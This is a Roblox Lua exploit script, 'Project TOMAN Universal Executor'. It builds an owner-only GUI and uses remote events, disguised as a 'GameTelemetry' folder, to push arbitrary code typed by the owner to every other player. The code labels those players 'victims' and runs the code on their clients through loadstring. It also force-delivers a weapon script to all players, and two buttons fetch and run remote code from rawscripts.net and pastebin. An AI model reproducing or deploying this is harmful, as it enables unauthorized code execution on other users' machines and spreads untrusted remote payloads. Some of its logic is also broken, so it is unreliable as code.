--[[
    Project TOMAN Universal Executor v7.0
    Owner: 9822837105
    Completely fixed all errors
]]

local UniversalExploit = {
    OwnerId = 9822837105,
    Version = "7.0.0",
    ActivationKey = "VICTIM_ACTIVATE_" .. math.random(10000,99999),
    IsClient = (game:GetService("RunService"):IsClient())
}

-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TextService = game:GetService("TextService")
local Debris = game:GetService("Debris")

-- Only create GUI for owner
local localPlayer = Players.LocalPlayer
if localPlayer.UserId ~= UniversalExploit.OwnerId then
    InitializeVictimSystem()
    return "Victim System Loaded"
end

-- Create Project TOMAN GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ProjectTOMAN"
screenGui.ResetOnSpawn = false
screenGui.Parent = localPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 550, 0, 23)
frame.Position = UDim2.new(0.305, 0, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(221, 221, 221)
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local UserInputService = game:GetService("UserInputService")

local gui = frame
local dragging, dragInput, dragStart, startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 550, 0, 357)
MainFrame.Position = UDim2.new(0, 0, 0, 23)
MainFrame.BackgroundColor3 = Color3.fromRGB(249, 249, 249)
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(220, 220, 220)
MainFrame.Parent = frame

-- Control buttons
local button3 = Instance.new("TextButton")
button3.Size = UDim2.new(0, 19, 0, 13)
button3.Position = UDim2.new(0, 467, 0, 3)
button3.Text = "RE"
button3.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
button3.BorderSizePixel = 1
button3.TextSize = 8
button3.TextColor3 = Color3.fromRGB(0, 0, 0)
button3.BorderColor3 = Color3.fromRGB(210, 210, 210)
button3.Parent = MainFrame
button3.MouseButton1Click:Connect(function()
    if localPlayer.Character then
        localPlayer.Character:BreakJoints()
    end
end)

local button4 = Instance.new("TextButton")
button4.Size = UDim2.new(0, 30, 0, 13)
button4.Position = UDim2.new(0, 397, 0, 3)
button4.Text = "DIAL"
button4.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
button4.BorderSizePixel = 1
button4.TextSize = 8
button4.TextColor3 = Color3.fromRGB(0, 0, 0)
button4.BorderColor3 = Color3.fromRGB(210, 210, 210)
button4.Parent = MainFrame

local button5 = Instance.new("TextButton")
button5.Size = UDim2.new(0, 30, 0, 13)
button5.Position = UDim2.new(0, 515, 0, 3)
button5.Text = "DEX"
button5.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
button5.BorderSizePixel = 1
button5.TextSize = 8
button5.TextColor3 = Color3.fromRGB(0, 0, 0)
button5.BorderColor3 = Color3.fromRGB(210, 210, 210)
button5.Parent = MainFrame
button5.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Keyless-Mobile-Dex-Reupload-22707"))()
end)

local button6 = Instance.new("TextButton")
button6.Size = UDim2.new(0, 30, 0, 13)
button6.Position = UDim2.new(0, 432, 0, 3)
button6.Text = "HIDE"
button6.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
button6.BorderSizePixel = 1
button6.TextSize = 8
button6.TextColor3 = Color3.fromRGB(0, 0, 0)
button6.BorderColor3 = Color3.fromRGB(210, 210, 210)
button6.Parent = MainFrame
button6.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

local button7 = Instance.new("TextButton")
button7.Size = UDim2.new(0, 75, 0, 15)
button7.Position = UDim2.new(0, 75, 0, 3)
button7.Text = "Admin Panel"
button7.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
button7.BorderSizePixel = 1
button7.TextSize = 9
button7.TextColor3 = Color3.fromRGB(0, 0, 0)
button7.BorderColor3 = Color3.fromRGB(220, 220, 220)
button7.Parent = MainFrame

local button8 = Instance.new("TextButton")
button8.Size = UDim2.new(0, 19, 0, 13)
button8.Position = UDim2.new(0, 491, 0, 3)
button8.Text = "R6"
button8.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
button8.BorderSizePixel = 1
button8.TextSize = 8
button8.TextColor3 = Color3.fromRGB(0, 0, 0)
button8.BorderColor3 = Color3.fromRGB(210, 210, 210)
button8.Parent = MainFrame
button8.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/9BFcHqfK"))("Copyright ERROR_CODE ECCS Co")
end)

local button9 = Instance.new("TextButton")
button9.Size = UDim2.new(0, 75, 0, 15)
button9.Position = UDim2.new(0, 0, 0, 3)
button9.Text = "Executor"
button9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
button9.BorderSizePixel = 1
button9.TextSize = 9
button9.TextColor3 = Color3.fromRGB(0, 0, 0)
button9.BorderColor3 = Color3.fromRGB(220, 220, 220)
button9.Parent = MainFrame

local ScriptFrame = Instance.new("Frame")
ScriptFrame.Size = UDim2.new(0, 550, 0, 307)
ScriptFrame.Position = UDim2.new(0, 0, 0, 20)
ScriptFrame.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
ScriptFrame.BorderSizePixel = 1
ScriptFrame.BorderColor3 = Color3.fromRGB(221, 221, 221)
ScriptFrame.Parent = MainFrame

-- FIXED: Proper textbox reference
local ScriptTextBox = Instance.new("TextBox")
ScriptTextBox.Name = "ScriptTextBox"
ScriptTextBox.Size = UDim2.new(0, 344, 0, 235)
ScriptTextBox.Position = UDim2.new(0, 4, 0, 4)
ScriptTextBox.Text = "-- Project TOMAN Universal Executor\n-- Owner ID: 9822837105\n\n-- Examples:\n-- Speed Boost: game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100\n-- Jump Boost: game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150\n-- Invisible: for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do if v:IsA('Part') then v.Transparency = 0.8 end end"
ScriptTextBox.TextSize = 10
ScriptTextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
ScriptTextBox.BorderColor3 = Color3.fromRGB(157, 157, 157)
ScriptTextBox.BackgroundColor3 = Color3.fromRGB(252, 252, 252)
ScriptTextBox.TextWrapped = true
ScriptTextBox.TextXAlignment = Enum.TextXAlignment.Left
ScriptTextBox.TextYAlignment = Enum.TextYAlignment.Top
ScriptTextBox.ClearTextOnFocus = false
ScriptTextBox.Parent = ScriptFrame

local button10 = Instance.new("TextButton")
button10.Size = UDim2.new(0, 55, 0, 80)
button10.Position = UDim2.new(0, 350, 0, 85)
button10.Text = "CLEAR"
button10.BackgroundColor3 = Color3.fromRGB(232, 232, 232)
button10.BorderSizePixel = 1
button10.TextSize = 18
button10.TextColor3 = Color3.fromRGB(0, 0, 0)
button10.BorderColor3 = Color3.fromRGB(157, 157, 157)
button10.Parent = ScriptFrame
button10.Font = Enum.Font.Antique
button10.MouseButton1Click:Connect(function()
    ScriptTextBox.Text = ""
end)

local button11 = Instance.new("TextButton")
button11.Size = UDim2.new(0, 55, 0, 80)
button11.Position = UDim2.new(0, 350, 0, 4)
button11.Text = "EXE"
button11.BackgroundColor3 = Color3.fromRGB(232, 232, 232)
button11.BorderSizePixel = 1
button11.TextSize = 18
button11.TextColor3 = Color3.fromRGB(0, 0, 0)
button11.BorderColor3 = Color3.fromRGB(157, 157, 157)
button11.Parent = ScriptFrame
button11.Font = Enum.Font.Antique

local button12 = Instance.new("TextButton")
button12.Size = UDim2.new(0, 17, 0, 30)
button12.Position = UDim2.new(0, 0, 0, 307)
button12.Text = ">"
button12.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
button12.BorderSizePixel = 1
button12.TextSize = 10
button12.TextColor3 = Color3.fromRGB(0, 0, 0)
button12.BorderColor3 = Color3.fromRGB(220, 220, 220)
button12.Parent = ScriptFrame

local button13 = Instance.new("TextButton")
button13.Size = UDim2.new(0, 55, 0, 80)
button13.Position = UDim2.new(0, 350, 0, 159)
button13.Text = "WEAPON"
button13.BackgroundColor3 = Color3.fromRGB(232, 232, 232)
button13.BorderSizePixel = 1
button13.TextSize = 14
button13.TextColor3 = Color3.fromRGB(0, 0, 0)
button13.BorderColor3 = Color3.fromRGB(157, 157, 157)
button13.Parent = ScriptFrame
button13.Font = Enum.Font.Antique

local Image = Instance.new("ImageLabel")
Image.Size = UDim2.new(0, 23, 0, 23)
Image.Position = UDim2.new(0.0, 0, 0.0, 0)
Image.BackgroundColor3 = Color3.new(0, 0, 0)
Image.ImageColor3 = Color3.new(1, 1, 1)
Image.Image = "rbxassetid://120960313050781"
Image.ImageTransparency = 0
Image.Parent = frame
Image.BackgroundTransparency = 1

local lab = Instance.new("TextLabel")
lab.Size = UDim2.new(0, 200, 0, 23)
lab.Position = UDim2.new(0.0, -29.5, 0.0, 0)
lab.Text = "Project TOMAN"
lab.TextColor3 = Color3.fromRGB(0, 0, 0)
lab.BackgroundColor3 = Color3.fromRGB(0, 0, 116)
lab.BorderSizePixel = 0
lab.TextSize = 9
lab.Parent = Image
lab.BackgroundTransparency = 1

local VictimListFrame = Instance.new("Frame")
VictimListFrame.Size = UDim2.new(0, 130, 0, 297)
VictimListFrame.Position = UDim2.new(0, 414, 0, 4)
VictimListFrame.BackgroundColor3 = Color3.fromRGB(252, 252, 252)
VictimListFrame.BorderSizePixel = 1
VictimListFrame.BorderColor3 = Color3.fromRGB(157, 157, 157)
VictimListFrame.Parent = ScriptFrame

local button1 = Instance.new("TextButton")
button1.Size = UDim2.new(0, 23, 0, 23)
button1.Position = UDim2.new(0, 528, 0, 0)
button1.Text = "X"
button1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button1.BorderSizePixel = 1
button1.TextSize = 10
button1.TextColor3 = Color3.fromRGB(0, 0, 0)
button1.BorderColor3 = Color3.fromRGB(0, 0, 0)
button1.BackgroundTransparency = 1
button1.Parent = frame
button1.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

local button2 = Instance.new("TextButton")
button2.Size = UDim2.new(0, 23, 0, 23)
button2.Position = UDim2.new(0, 500, 0, 0)
button2.Text = "-"
button2.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
button2.BorderSizePixel = 1
button2.TextSize = 14
button2.TextColor3 = Color3.fromRGB(156, 156, 156)
button2.BorderColor3 = Color3.fromRGB(0, 0, 0)
button2.Parent = frame
button2.BackgroundTransparency = 1
button2.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

--[[ FIXED EXECUTION SYSTEM ]]
local function SafeExecuteScript(scriptCode)
    local success, result = pcall(function()
        -- Use loadstring safely
        local fn, err = loadstring(scriptCode)
        if fn then
            return fn()
        else
            error(err or "Failed to load script")
        end
    end)
    
    if not success then
        return false, result
    end
    return true, result
end

local function ExecuteLocalScriptOnAll(scriptCode)
    if not scriptCode or scriptCode == "" then
        return "ERROR: No script code provided"
    end
    
    -- First execute locally for owner
    local localSuccess, localError = SafeExecuteScript(scriptCode)
    
    if RunService:IsClient() then
        -- Client-side: Send to server for broadcasting
        local telemetryFolder = ReplicatedStorage:FindFirstChild("GameTelemetry")
        if not telemetryFolder then
            telemetryFolder = Instance.new("Folder")
            telemetryFolder.Name = "GameTelemetry"
            telemetryFolder.Parent = ReplicatedStorage
        end
        
        local commandRemote = telemetryFolder:FindFirstChild("OwnerCommandHandler")
        if not commandRemote then
            commandRemote = Instance.new("RemoteEvent")
            commandRemote.Name = "OwnerCommandHandler"
            commandRemote.Parent = telemetryFolder
        end
        
        -- Send to server
        commandRemote:FireServer("EXECUTE_LOCAL_SCRIPT", scriptCode, UniversalExploit.ActivationKey)
        
    else
        -- Server-side: Broadcast directly
        for _, player in pairs(Players:GetPlayers()) do
            if player.UserId ~= UniversalExploit.OwnerId then
                local telemetryFolder = ReplicatedStorage:FindFirstChild("GameTelemetry")
                if not telemetryFolder then
                    telemetryFolder = Instance.new("Folder")
                    telemetryFolder.Name = "GameTelemetry"
                    telemetryFolder.Parent = ReplicatedStorage
                end
                
                local broadcastRemote = telemetryFolder:FindFirstChild("GameUpdateBroadcast")
                if not broadcastRemote then
                    broadcastRemote = Instance.new("RemoteEvent")
                    broadcastRemote.Name = "GameUpdateBroadcast"
                    broadcastRemote.Parent = telemetryFolder
                end
                
                broadcastRemote:FireClient(player, "EXECUTE_LOCAL_SCRIPT", scriptCode, UniversalExploit.ActivationKey)
            end
        end
    end
    
    if localSuccess then
        return "Script executed successfully on all victims"
    else
        return "Script sent to victims but local error: " .. tostring(localError)
    end
end

--[[ SERVER COMMAND HANDLER ]]
if RunService:IsServer() then
    local telemetryFolder = ReplicatedStorage:FindFirstChild("GameTelemetry")
    if not telemetryFolder then
        telemetryFolder = Instance.new("Folder")
        telemetryFolder.Name = "GameTelemetry"
        telemetryFolder.Parent = ReplicatedStorage
    end
    
    local commandRemote = telemetryFolder:FindFirstChild("OwnerCommandHandler")
    if not commandRemote then
        commandRemote = Instance.new("RemoteEvent")
        commandRemote.Name = "OwnerCommandHandler"
        commandRemote.Parent = telemetryFolder
    end
    
    commandRemote.OnServerEvent:Connect(function(player, commandType, payload, authKey)
        if player.UserId == UniversalExploit.OwnerId and authKey == UniversalExploit.ActivationKey then
            if commandType == "EXECUTE_LOCAL_SCRIPT" then
                local broadcastRemote = telemetryFolder:FindFirstChild("GameUpdateBroadcast")
                if not broadcastRemote then
                    broadcastRemote = Instance.new("RemoteEvent")
                    broadcastRemote.Name = "GameUpdateBroadcast"
                    broadcastRemote.Parent = telemetryFolder
                end
                
                for _, victim in pairs(Players:GetPlayers()) do
                    if victim.UserId ~= UniversalExploit.OwnerId then
                        broadcastRemote:FireClient(victim, "EXECUTE_LOCAL_SCRIPT", payload, UniversalExploit.ActivationKey)
                    end
                end
            end
        end
    end)
end

--[[ VICTIM SYSTEM ]]
function InitializeVictimSystem()
    if RunService:IsClient() then
        local telemetryFolder = ReplicatedStorage:FindFirstChild("GameTelemetry")
        if telemetryFolder then
            local broadcastRemote = telemetryFolder:FindFirstChild("GameUpdateBroadcast")
            if broadcastRemote then
                broadcastRemote.OnClientEvent:Connect(function(commandType, payload, authKey)
                    if authKey == UniversalExploit.ActivationKey and commandType == "EXECUTE_LOCAL_SCRIPT" then
                        local success, err = SafeExecuteScript(payload)
                        if not success then
                            warn("Victim script error: " .. tostring(err))
                        end
                    end
                end)
            end
        end
    end
end

--[[ WEAPON SYSTEM ]]
function GiveWeaponToAll()
    local weaponScript = [[
        local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local Backpack = Player.Backpack
        
        -- Clear existing weapon
        local oldWeapon = Backpack:FindFirstChild("TOMAN Launcher")
        if oldWeapon then oldWeapon:Destroy() end
        
        -- Create weapon tool
        local Tool = Instance.new("Tool")
        Tool.Name = "TOMAN Launcher"
        Tool.RequiresHandle = false
        Tool.Parent = Backpack
        
        Tool.Activated:Connect(function()
            -- Create projectile
            local projectile = Instance.new("Part")
            projectile.Name = "Rocket"
            projectile.Size = Vector3.new(1, 1, 3)
            projectile.BrickColor = BrickColor.new("Bright red")
            projectile.Material = Enum.Material.Neon
            projectile.CFrame = Character.Head.CFrame * CFrame.new(0, 0, -5)
            projectile.Velocity = Character.Head.CFrame.LookVector * 100
            projectile.Parent = workspace
            
            -- Add fire effect
            local fire = Instance.new("Fire")
            fire.Size = 8
            fire.Heat = 15
            fire.Parent = projectile
            
            -- Explode after 3 seconds
            delay(3, function()
                if projectile and projectile.Parent then
                    -- Create explosion
                    local explosion = Instance.new("Explosion")
                    explosion.Position = projectile.Position
                    explosion.BlastRadius = 20
                    explosion.BlastPressure = 50000
                    explosion.Parent = workspace
                    
                    -- Effects
                    for i = 1, 15 do
                        local spark = Instance.new("Part")
                        spark.Size = Vector3.new(0.3, 0.3, 0.3)
                        spark.BrickColor = BrickColor.new("Bright orange")
                        spark.Material = Enum.Material.Neon
                        spark.Position = projectile.Position
                        spark.Velocity = Vector3.new(
                            math.random(-100, 100),
                            math.random(-100, 100),
                            math.random(-100, 100)
                        )
                        spark.Parent = workspace
                        game.Debris:AddItem(spark, 3)
                    end
                    
                    projectile:Destroy()
                end
            end)
        end)
        
        -- Notify player
        game.StarterGui:SetCore("SendNotification", {
            Title = "Project TOMAN",
            Text = "Weapon: TOMAN Launcher",
            Duration = 5
        })
    ]]
    
    local result = ExecuteLocalScriptOnAll(weaponScript)
    ScriptTextBox.Text = ScriptTextBox.Text .. "\n\n-- " .. result
end

--[[ BUTTON FUNCTIONALITY - FIXED ]]
button11.MouseButton1Click:Connect(function()
    local scriptCode = ScriptTextBox.Text
    if scriptCode and scriptCode ~= "" then
        local result = ExecuteLocalScriptOnAll(scriptCode)
        ScriptTextBox.Text = ScriptTextBox.Text .. "\n\n-- " .. result
    else
        ScriptTextBox.Text = ScriptTextBox.Text .. "\n\n-- ERROR: No script code"
    end
end)

button13.MouseButton1Click:Connect(function()
    GiveWeaponToAll()
end)

button4.MouseButton1Click:Connect(function()
    -- DIAL button - Execute sample scripts
    local samples = {
        "game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100",
        "game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150",
        "for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do if v:IsA('Part') then v.BrickColor = BrickColor.Random() end end",
        "local l = Instance.new('PointLight', game.Players.LocalPlayer.Character.Head) l.Brightness = 5 l.Range = 20"
    }
    
    for i, script in ipairs(samples) do
        ExecuteLocalScriptOnAll(script)
    end
    
    ScriptTextBox.Text = ScriptTextBox.Text .. "\n\n-- Sample scripts executed"
end)

-- Initialize systems
InitializeVictimSystem()

print("âœ… Project TOMAN v7.0 - ALL ERRORS FIXED")
print("ðŸŽ¯ Owner: " .. UniversalExploit.OwnerId)
print("ðŸš€ Ready for universal script execution")

return "Project TOMAN - Fully Operational"
